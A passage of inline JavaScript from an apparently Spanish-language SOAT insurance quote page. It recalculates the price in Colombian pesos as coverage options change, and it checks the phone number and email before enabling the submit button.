                ? accidentes.getAttribute('data-label')
                : 'Accidentes Personales';
            lblAccidentes.textContent = etiqueta;
        }

        var total = baseSoat + precioTerceros + precioAccidentes;
        if (valTotal) {
            valTotal.textContent = formatoCOP(total);
        }

        document.querySelectorAll('.acc-clear-btn').forEach(function (btn) {
            var nombre = btn.getAttribute('data-clear');
            var checked = form.querySelector('input[name="' + nombre + '"]:checked');
            btn.hidden = !checked;
        });
    }

    form.querySelectorAll('.js-recalc').forEach(function (radio) {
        radio.addEventListener('change', recalcular);
    });

    document.querySelectorAll('.acc-clear-btn').forEach(function (btn) {
        btn.addEventListener('click', function (e) {
            e.stopPropagation();
            var nombre = btn.getAttribute('data-clear');
            form.querySelectorAll('input[name="' + nombre + '"]').forEach(function (r) {
                r.checked = false;
            });
            recalcular();
        });
    });

    recalcular();

    var inputCelular = document.getElementById('celular')
                    || form.querySelector('input[name="celular"]');
    var inputEmail   = document.getElementById('email')
                    || form.querySelector('input[name="email"]');
    var btnSiguiente = form.querySelector('button[type="submit"]');

    function telefonoValido(valor) {
        return /^[0-9]{7,10}$/.test((valor || '').trim());
    }
    function emailValido(valor) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test((valor || '').trim());
    }

    function actualizarEstadoBoton() {
        if (!inputCelular || !inputEmail || !btnSiguiente) return;

        var listo = telefonoValido(inputCelular.value) && emailValido(inputEmail.value);

        if (listo) {
            btnSiguiente.classList.add('btn-activo');
            btnSiguiente.disabled = false;
        } else {
            btnSiguiente.classList.remove('btn-activo');
            btnSiguiente.disabled = true;
        }
    }

    if (inputCelular) {
        inputCelular.addEventListener('input', actualizarEstadoBoton);
        inputCelular.addEventListener('change', actualizarEstadoBoton);
    }
    if (inputEmail) {
        inputEmail.addEventListener('input', actualizarEstadoBoton);
        inputEmail.addEventListener('change', actualizarEstadoBoton);
    }

    actualizarEstadoBoton();

})();
</script>

</body>
</html>